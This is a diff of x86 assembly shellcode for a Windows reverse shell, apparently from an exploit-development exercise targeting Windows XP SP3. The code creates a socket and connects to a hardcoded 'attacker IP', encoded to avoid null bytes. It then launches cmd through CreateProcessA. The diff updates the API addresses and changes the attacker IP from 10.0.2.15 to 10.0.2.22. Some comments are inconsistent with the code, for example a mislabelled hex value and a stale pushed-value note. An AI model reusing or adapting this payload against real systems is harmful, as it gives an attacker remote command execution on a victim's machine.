@@ -10,17 +10,23 @@ inc ebx                 ; Type: SOCK_STREAM=1
 push ebx                ; Push 'type' parameter
 inc ebx                 ; Af: AF_INET=2
 push ebx                ; Push 'af' parameter
-mov ebx,0x76157140      ; Address of WSASocketA() on WinXPSP3
+mov ebx,0x771e9ba0      ; Address of WSASocketA() on WinXPSP3
 call ebx                ; Call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 
 ; connect()
-mov ebx,0x6457555f      ; Attacker IP: 10.0.2.15. In reverse order:
-                        ; hex(15) = 0x0f
+; mov ebx,0x6457555f      ; Attacker IP: 10.0.2.15. In reverse order:
+;                        ; hex(15) = 0x0f
+;                        ; hex(2) = 0x02
+;                        ; hex(0) = 0x00
+;                        ; hex(10) = 0x0a
+;                        ; 0x0802000a + 55555555 = 6457555f
+mov ebx,0x6B57555F      ; Attacker IP: 10.0.2.22. In reverse order:
+                        ; hex(15) = 0x16
                         ; hex(2) = 0x02
                         ; hex(0) = 0x00
                         ; hex(10) = 0x0a
-                        ; 0x0802000a + 55555555 = 6457555f
+                        ; 0x1602000a + 55555555 = 6B57555F
 sub ebx,0x55555555      ; Substract again 55555555 to get the original IP
 push ebx                ; This will push 0x1400a8c0 to the stack without
                         ; injecting null bytes
@@ -32,7 +38,7 @@ mov ebx,esp             ; EBX now has the pointer to sockaddr structure
 push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
 push ebx                ; Push pointer ('name' parameter)
 push esi                ; Push saved socket handler ('s' parameter)
-mov ebx,0x76155710      ; Address of connect() on WinXPSP3
+mov ebx,0x771e6980      ; Address of connect() on WinXPSP3
 call ebx                ; Call connect()
 
 ; CreateProcessA()
@@ -90,5 +96,5 @@ push ebx                ; lpThreadAttributes
 push ebx                ; lpProcessAttributes
 push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
 push ebx                ; lpApplicationName
-mov ebx,0x769a4110      ; Call CreateProcessA()
+mov ebx,0x7594f960      ; Call CreateProcessA()
 call ebx
